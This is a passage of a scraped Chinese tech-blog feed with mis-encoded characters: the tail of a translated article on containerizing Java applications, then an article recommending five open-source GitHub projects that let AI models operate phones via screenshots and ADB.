<p>å®¹å™¨åŒ–ä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿå°†æ‰€æœ‰å¿…éœ€çš„åº”ç”¨ç¨‹åºèµ„æºå’Œæ”¯æŒæœåŠ¡ç»„åˆåˆ°ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨é•œåƒä¸­ï¼Œå¹¶æ›´è½»æ¾åœ°éƒ¨ç½²ã€è¿è¡Œå’Œç®¡ç†å®ƒä»¬ã€‚å¦‚æœæ“ä½œå¾—å½“ï¼Œå®¹å™¨åŒ–å¯ä»¥ä»é•œåƒåˆ›å»ºç‚¹å¼€å§‹å®ç°å®‰å…¨æ€§å’Œä¸€è‡´æ€§ã€‚å®¹å™¨å¯ä»¥åœ¨æˆªç„¶ä¸åŒçš„æ“ä½œå¹³å°ä¸Šè¿è¡Œï¼Œä»æœ¬åœ°æœºå™¨åˆ°å…¨çƒå¯æ‰©å±•çš„äº‘ç¯å¢ƒã€‚å¯ä»¥æ„å»ºæµæ°´çº¿ï¼Œè½»æ¾åœ°åœ¨å®ƒä»¬ä¹‹é—´è¿‡æ¸¡ã€‚å› æ­¤ï¼Œå¼€å‘äººå‘˜æ„å»ºå’Œè¿è¡Œæ”¯æŒç”Ÿäº§å·¥ä½œè´Ÿè½½çš„ç›¸åŒæ„ä»¶ï¼Œå‡å°‘äº†å†²çªå¹¶ç®€åŒ–äº†è°ƒä¼˜å’Œæ•…éšœæ’é™¤ã€‚</p>
<p>å¦‚æœæ‚¨æ˜¯å®¹å™¨æ–°æ‰‹ï¼Œè¯·ä»å°å¤„ç€æ‰‹ï¼Œåœ¨æœ¬åœ°æ„å»ºä»¥è·å¾—çŸ¥è¯†å’Œç¨³å®šçš„åŸºç¡€ï¼Œç„¶åé€šè¿‡çº³å…¥æ›´å¤šå®¹å™¨æœ€ä½³å®è·µã€æ„å»ºæµæ°´çº¿å’Œåˆé€‚çš„äº‘å¹³å°æ¥"æ‰©å±•æ„å»º"ï¼Œé€æ­¥èµ°å‘å¼ºå¤§çš„åº”ç”¨ç¨‹åºéƒ¨ç½²ç”Ÿäº§æ¨¡å‹ã€‚</p>
<p><strong>å…¶ä»–è€ƒè™‘å› ç´ å’Œèµ„æºï¼š</strong></p>
<ul>
<li>
<p>å·¥å…· â€“ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.docker.com%2F" target="_blank" title="https://www.docker.com/" ref="nofollow noopener noreferrer">Docker</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fpodman.io%2F" target="_blank" title="https://podman.io/" ref="nofollow noopener noreferrer">Podman</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fminikube.sigs.k8s.io%2F" target="_blank" title="https://minikube.sigs.k8s.io/" ref="nofollow noopener noreferrer">Minikube</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fskaffold.dev%2F" target="_blank" title="https://skaffold.dev/" ref="nofollow noopener noreferrer">Skaffold</a></p>
</li>
<li>
<p>åŸºäº JVM OSS çš„å¯è§‚æµ‹æ€§å·¥å…· â€“ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.oracle.com%2Fjavacomponents%2Fjmc-5-4%2Fjfr-runtime-guide%2F" target="_blank" title="https://docs.oracle.com/javacomponents/jmc-5-4/jfr-runtime-guide/" ref="nofollow noopener noreferrer">Java Flight Recorder</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.oracle.com%2Fen%2Fjava%2Fjava-components%2Fjdk-mission-control%2F" target="_blank" title="https://docs.oracle.com/en/java/java-components/jdk-mission-control/" ref="nofollow noopener noreferrer">Java Mission Control</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fvisualvm.github.io%2F" target="_blank" title="https://visualvm.github.io/" ref="nofollow noopener noreferrer">Visual VM</a>, <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FAdoptOpenJDK%2Fjitwatch" target="_blank" title="https://github.com/AdoptOpenJDK/jitwatch" ref="nofollow noopener noreferrer">Jitwatch</a></p>
</li>
</ul>
<blockquote>
<p><strong>ä½œè€…ï¼šMARK A. HECKLER,</strong></p>
</blockquote>
<blockquote>
<p><strong>å¾®è½¯é¦–å¸­äº‘æŠ€æœ¯æ¨å¹¿ä¸“å®¶ï¼ˆJava/JVM è¯­è¨€ï¼‰</strong></p>
</blockquote>
<blockquote>
<p>Mark Heckler æ˜¯ä¸€åè½¯ä»¶å¼€å‘äººå‘˜ï¼Œå¾®è½¯çš„ Java/JVM è¯­è¨€é¦–å¸­äº‘æŠ€æœ¯æ¨å¹¿ä¸“å®¶ï¼Œä¼šè®®æ¼”è®²è€…ï¼ŒJava Champion å’Œ Kotlin å¼€å‘ä¸“å®¶ï¼Œä¸“æ³¨äºä¸ºäº‘å’Œè¾¹ç¼˜è®¡ç®—å¹³å°å¿«é€Ÿå¼€å‘ç”Ÿäº§è½¯ä»¶ã€‚Mark æ˜¯å¼€æºè´¡çŒ®è€…ï¼Œä¹Ÿæ˜¯ã€ŠSpring Boot: Up and Runningã€‹çš„ä½œè€…ï¼Œå¯ä»¥åœ¨ X @mkheck ä¸Šæ‰¾åˆ°ä»–ã€‚</p>
</blockquote>
<hr/>
<p>ã€æ³¨ã€‘æœ¬æ–‡è¯‘è‡ªï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdzone.com%2Frefcardz%2Fjava-application-containerization-and-deployment" target="_blank" title="https://dzone.com/refcardz/java-application-containerization-and-deployment" ref="nofollow noopener noreferrer">Java Application Containerization and Deployment</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[5 ä¸ª AI æ“çºµæ‰‹æœºçš„ GitHub é¡¹ç›®ï¼Œå¤ªå¼ºäº†]]></title>    <link>https://juejin.cn/post/7577031454585454619</link>    <guid>https://juejin.cn/post/7577031454585454619</guid>    <pubDate>2025-11-27T06:58:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577031454585454619" data-draft-id="7576936862632509440" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="5 ä¸ª AI æ“çºµæ‰‹æœºçš„ GitHub é¡¹ç›®ï¼Œå¤ªå¼ºäº†"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-11-27T06:58:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é€›é€›GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            5 ä¸ª AI æ“çºµæ‰‹æœºçš„ GitHub é¡¹ç›®ï¼Œå¤ªå¼ºäº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é€›é€›GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:58:32.000Z" title="Thu Nov 27 2025 06:58:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨è¿‡å»ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è‡ªåŠ¨åŒ–æ“ä½œæ‰‹æœºï¼Œé€šå¸¸éœ€è¦ä½¿ç”¨ Appium æˆ– Airtest è¿™æ ·çš„å·¥å…·ï¼Œä½†è¿™è¦æ±‚å¼€å‘è€…å¿…é¡»æ·±å…¥äº†è§£ APP çš„åº•å±‚å…ƒç´  IDï¼Œæ¯”å¦‚Â resource-idÂ æˆ–Â xpathã€‚</p>
<p>ä¸€æ—¦ APP æ›´æ–°ï¼ŒID å˜äº†ï¼Œè„šæœ¬å°±åºŸäº†ã€‚</p>
<p>ç°åœ¨æœ‰äº† AI å¤§æ¨¡å‹ï¼Œå°¤å…¶æ˜¯è§†è§‰æ¨¡å‹ï¼Œè®© AI æ“çºµæ‰‹æœºåšæˆäº†å¯èƒ½ã€‚æ¨èå‡ ä¸ªæ¯”è¾ƒçƒ­é—¨çš„ AI æ“çºµæ‰‹æœºçš„å¼€æºé¡¹ç›®ï¼Œæ„Ÿå…´è¶£çš„æ”¶è—ã€‚</p>
<h2 data-id="heading-0">01ã€MobiAgentï¼šç§»åŠ¨æ™ºèƒ½ä½“æ¡†æ¶</h2>
<p>è¿™ä¸ªå« MobiAgent çš„å¼€æºé¡¹ç›®æ˜¯ IPADS å®éªŒå®¤ä¸“ä¸ºæ‰‹æœºäº¤äº’è®¾è®¡çš„æ¡†æ¶ã€‚èƒ½è®© AI æ§åˆ¶æ‰‹æœºè‡ªå·±å¹²æ´»ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79552d1aea864c44b3c4ab8ca1b77938~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831512&amp;x-signature=3Z6k9I1U7qgCnZo%2BZujuWtHVjuA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™ä¸ªæ™ºèƒ½ Agent ç³»ç»Ÿï¼Œå¯ä»¥æŠŠå¤æ‚ä»»åŠ¡åˆ†è§£ä¸ºä¸‰ä¸ªä¸“ä¸šåŒ–æ¨¡å—ï¼š</p>
<p>PlannerÂ è´Ÿè´£åˆ¶å®šæ•´ä½“è®¡åˆ’ï¼ŒDeciderÂ åˆ¤æ–­æ¯ä¸€æ­¥è¯¥ç‚¹å‡»å“ªé‡Œï¼ŒGrounderÂ åˆ™ç²¾å‡†å®šä½å±å¹•ä¸Šçš„å…·ä½“æ“ä½œä½ç½®ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bf0018ece224af3935f4da5dd751260~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831512&amp;x-signature=ySMiEp6LvVzwbeBW2LyRfC4hyTY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä»åŸç†ä¸Šè®²ï¼ŒMobiAgent åŒ…æ‹¬ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶ï¼šMobiMind æ¨¡å‹å®¶æ—ã€AgentRR åŠ é€Ÿæ¡†æ¶å’Œ MobiFlow åŸºå‡†æµ‹è¯•å¹³å°ã€‚</p>
<p>MobiMind æ˜¯æ™ºèƒ½æ ¸å¿ƒï¼ŒåŒ…å«å¤šä¸ªä¸åŒå‚æ•°è§„æ¨¡çš„æ¨¡å‹ã€‚AgentRR åŠ é€Ÿæ¡†æ¶åˆ™å¯¹é‡å¤ä»»åŠ¡è¿›è¡Œä¼˜åŒ–ï¼Œå¤§å¹…é™ä½äºŒæ¬¡æ‰§è¡Œçš„è€—æ—¶ã€‚</p>
<p>è€Œ MobiFlow åŸºå‡†æµ‹è¯•å¹³å°ï¼Œè¦†ç›–å°çº¢ä¹¦ã€é«˜å¾·åœ°å›¾ã€é¥¿äº†ä¹ˆã€æ·˜å®ç­‰ 10 + ä¸»æµ Appï¼ŒåŒ…å«ç®€å•å’Œå›°éš¾ä¸¤ä¸ªéš¾åº¦ç­‰çº§ï¼Œä¸ºç§»åŠ¨æ™ºèƒ½ä»£ç†çš„æ€§èƒ½è¯„ä¼°æä¾›äº†æ ‡å‡†åŒ–åœºæ™¯ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/IPADS-SAI/MobiAgent</span>
</code></pre>
<h2 data-id="heading-1">02ã€Mobile-Agentï¼šé˜¿é‡Œå¼€æº</h2>
<p>è¿™ä¸ªå«Â <strong>Mobile-Agent çš„</strong>å¼€æºé¡¹ç›®æ˜¯é˜¿é‡Œå¼€æºçš„ã€‚<strong>Mobile-Agent</strong> èƒ½çœ‹è§å±å¹•ã€èƒ½ç‚¹å‡»æŒ‰é’®ã€èƒ½åƒäººä¸€æ ·è·¨ APP æ“ä½œï¼Œè€Œä¸”ä¸ä¾èµ–åŸæœ¬å¤æ‚çš„ç³»ç»Ÿåå°æ¥å£ï¼Œè€Œæ˜¯åƒäººç±»ä¸€æ ·ï¼Œé€šè¿‡çœ‹å±å¹•æ¥æ“ä½œæ‰‹æœºã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d186c804a9354ba5bdfb8f2dff116678~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831512&amp;x-signature=eroY6p2XV8m0lutGGNQbu1LvGcQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åŸç†éƒ½å·®ä¸å¤šï¼Œ AI è¯†åˆ«å±å¹•ä¸Šçš„æ‰€æœ‰å›¾æ ‡ã€æ–‡å­—å’ŒæŒ‰é’®ã€‚å³ä½¿æŒ‰é’®æ²¡æœ‰æ–‡å­—è¯´æ˜ï¼Œåªæœ‰ä¸€ä¸ªå›¾æ ‡ï¼Œå®ƒä¹Ÿèƒ½é€šè¿‡è§†è§‰ç†è§£å…¶å«ä¹‰ã€‚</p>
<p>æ ¹æ®ä½ çš„æŒ‡ä»¤ç”Ÿæˆä¸€æ­¥æ­¥çš„è®¡åˆ’ã€‚ç„¶å AI ç»“åˆå½“å‰å±å¹•çŠ¶æ€ï¼Œå†³å®šä¸‹ä¸€æ­¥å…·ä½“ç‚¹å“ªé‡Œï¼Œè¿˜æ˜¯æ»‘åŠ¨ï¼Œæˆ–è€…æ˜¯è¾“å…¥æ–‡å­—ã€‚</p>
<p>é€šè¿‡ ADBï¼ˆAndroid Debug Bridgeï¼‰å‘æ‰‹æœºå‘é€ç‚¹å‡»æˆ–æ»‘åŠ¨æŒ‡ä»¤ã€‚è€Œä¸”æ¯æ‰§è¡Œä¸€æ­¥ï¼Œå®ƒä¼šå†æ¬¡æˆªå›¾ç¡®è®¤ï¼Œå¦‚æœå‘ç°ä¸å¯¹ï¼Œå®ƒä¼šè‡ªæˆ‘ä¿®æ­£ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/X-PLUG/MobileAgent</span>
</code></pre>
<h2 data-id="heading-2">03ã€Droidrunæœºè‡ªåŠ¨åŒ– Agent æ¡†æ¶</h2>
<p>DroidrunÂ æ˜¯ä¸€ä¸ªåŸºäº AI å¤§æ¨¡å‹çš„ Android/iOS è‡ªåŠ¨åŒ– Agent æ¡†æ¶ã€‚</p>
<p>ç›®å‰åœ¨ GitHub ä¸Šæœ‰ 6.2K çš„ Starã€‚</p>
<p>å®ƒçš„æ ¸å¿ƒç†å¿µæ˜¯å°†æ€è€ƒäº¤ç»™ AIï¼Œå°†æ‰§è¡Œäº¤ç»™æ¡†æ¶ï¼Œä»è€Œæ‰“ç ´äº†ä¼ ç»Ÿè‡ªåŠ¨åŒ–è„šæœ¬å¯¹ç‰¹å®š UI æ§ä»¶çš„å¼ºä¾èµ–ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c21ac6223bf74939abbda4cc862eba33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831512&amp;x-signature=HG4VPmiFDMh2c4qEY4XCNcVpwAw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/droidrun/droidrun</span>
</code></pre>
<h2 data-id="heading-3">04ã€AppAgentï¼šè…¾è®¯å¼€æº</h2>
<p>è¿™ä¸ªå¼€æºé¡¹ç›®çš„å…¨ç§°æ˜¯ "Multimodal Agents as Smartphone Users"ï¼Œåƒæ™ºèƒ½æ‰‹æœºç”¨æˆ·ä¸€æ ·çš„å¤šæ¨¡æ€æ™ºèƒ½ä½“ã€‚</p>
<p>å®ƒçš„è®¾è®¡åˆè¡·æ˜¯èµ‹äºˆ AI Â Agent åƒäººç±»ç”¨æˆ·ä¸€æ ·çš„æ„ŸçŸ¥å’Œæ“ä½œèƒ½åŠ›ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df0e5718931b4ecc8a5215f63dd81320~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831512&amp;x-signature=%2FQWxhp3%2FpRSTPBNsNPKC3bogLRU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒé€šè¿‡ ADBï¼ˆAndroid Debug Bridgeï¼‰è·å–æ‰‹æœºå±å¹•æˆªå›¾ï¼Œå‘é€ç»™å¤šæ¨¡æ€å¤§æ¨¡å‹ã€‚</p>
<p>æ¨¡å‹åˆ†ææˆªå›¾ä¸­çš„ UI å…ƒç´ ï¼Œå†³å®šä¸‹ä¸€æ­¥æ˜¯ç‚¹å‡»å“ªä¸ªåæ ‡è¿˜æ˜¯æ»‘åŠ¨å±å¹•ï¼Œä»è€Œå®ç°çœŸæ­£çš„è§†è§‰äº¤äº’ã€‚</p>
<p>å’Œå…¶å®ƒå¼€æºé¡¹ç›®ä¸åŒï¼ŒAppAgentÂ æ¨¡ä»¿äº†äººç±»å­¦ä¹ æ–°è½¯ä»¶çš„è¿‡ç¨‹ï¼š</p>
<p>å½“ä½ ç»™å®ƒä¸€ä¸ªæ–°çš„ App æ—¶ï¼Œå®ƒå¯ä»¥é€šè¿‡è‡ªä¸»æ¢ç´¢æˆ–è€…è§‚å¯Ÿäººç±»æ¼”ç¤ºæ¥å­¦ä¹ ã€‚</p>
<p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šè®°å½•ä¸‹æ¯ä¸ªæŒ‰é’®æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå¹¶ç”Ÿæˆä¸€ä»½ä½¿ç”¨æ–‡æ¡£ï¼ˆKnowledge Baseï¼‰ã€‚</p>
<p>å½“éœ€è¦æ‰§è¡Œå…·ä½“ä»»åŠ¡ï¼Œå®ƒä¼šè°ƒç”¨ä¹‹å‰ç”Ÿæˆçš„æ–‡æ¡£ï¼Œç²¾å‡†åœ°æ‰§è¡Œæ“ä½œï¼Œè€Œä¸éœ€è¦æ¯æ¬¡éƒ½é‡æ–°æ‘¸ç´¢ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/TencentQQGYLab/AppAgent</span>
</code></pre>
<h2 data-id="heading-4">05ã€mobile-useï¼šè¯´å¥è¯è‡ªåŠ¨åŒ–ä½ çš„æ‰‹æœº</h2>
<p>è¿™ä¸ªå¼€æºé¡¹ç›®ç°åœ¨æœ‰ 1.8k çš„ Starã€‚æ”¯æŒå®‰å“å’Œ iOS ç³»ç»Ÿã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47268cab0c4f4c5987db78a37eedd928~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831512&amp;x-signature=OEFgGp%2BYgsVPvs6Qg34QAlOJfcg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>Mobile-Use</strong>Â æ˜¯ä¸€ä¸ªç”± Minitap AI å›¢é˜Ÿå¼€æºçš„ Python åº“ã€‚å®ƒçš„æ ¸å¿ƒé€»è¾‘æ˜¯è®© AI æ¨¡å‹æ¨¡æ‹Ÿäººç±»çš„æ“ä½œè¡Œä¸ºã€‚</p>
<p>å®ƒä¼šæˆªå–å½“å‰æ‰‹æœºå±å¹•çš„å›¾åƒï¼Œå°†æˆªå›¾å’Œç”¨æˆ·çš„æŒ‡ä»¤å‘é€ç»™å¤šæ¨¡æ€å¤§æ¨¡å‹ã€‚æ¨¡å‹ä¼šåˆ†ææˆªå›¾ï¼Œåˆ¤æ–­å¦‚æœè¦å®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œæˆ‘ç°åœ¨è¯¥ç‚¹å“ªé‡Œã€‚</p>
<p>æ¨¡å‹è¿”å›å…·ä½“çš„åæ ‡æˆ–æ“ä½œæŒ‡ä»¤ï¼ˆç‚¹å‡»ã€æ»‘åŠ¨ã€è¾“å…¥ï¼‰ï¼ŒMobile-Use å°†å…¶è½¬æ¢ä¸ºåº•å±‚çš„Â ADB å‘½ä»¤æ‰§è¡Œã€‚</p>
<p>æ‰§è¡Œå®ŒåŠ¨ä½œåï¼Œå†æ¬¡æˆªå›¾ï¼Œç¡®è®¤æ˜¯å¦è¿›å…¥äº†ä¸‹ä¸€é¡µï¼Œç›´åˆ°ä»»åŠ¡å®Œæˆã€‚</p>
<pre><code class="hljs language-perl" lang="perl">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-regexp">//gi</span>thub.com/minitap-ai/mobile-<span class="hljs-keyword">use</span>
</code></pre>
<p>è€Œä¸”åœ¨æŠ€æœ¯å®ç°ä¸Šï¼Œmobile-use é›†æˆäº† Maestro ç§»åŠ¨æµ‹è¯•æ¡†æ¶ä½œä¸ºåº•å±‚äº¤äº’å¼•æ“ï¼Œç¡®ä¿äº†å¯¹çœŸå®è®¾å¤‡æ“ä½œçš„ç¨³å®šæ€§å’Œå¯é æ€§ã€‚åŒæ—¶ï¼Œé¡¹ç›®æ”¯æŒå¤šç§å¤§æ¨¡å‹åç«¯ï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦é€‰æ‹© OpenAI APIã€æœ¬åœ°éƒ¨ç½²æ¨¡å‹æˆ–å…¶ä»–å…¼å®¹æœåŠ¡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å°éœ€æ±‚åšåˆ°åƒä¸‡ç¾å…ƒ ARRï¼šremove.bg å…¨æ¡ˆæ‹†è§£]]></title>    <link>https://juejin.cn/post/7576918517238349874</link>    <guid>https://juejin.cn/post/7576918517238349874</guid>    <pubDate>2025-11-27T05:17:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576918517238349874" data-draft-id="7576929700842160137" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å°éœ€æ±‚åšåˆ°åƒä¸‡ç¾å…ƒ ARRï¼šremove.bg å…¨æ¡ˆæ‹†è§£"/> <meta itemprop="keywords" content="äº§å“,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-11-27T05:17:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta 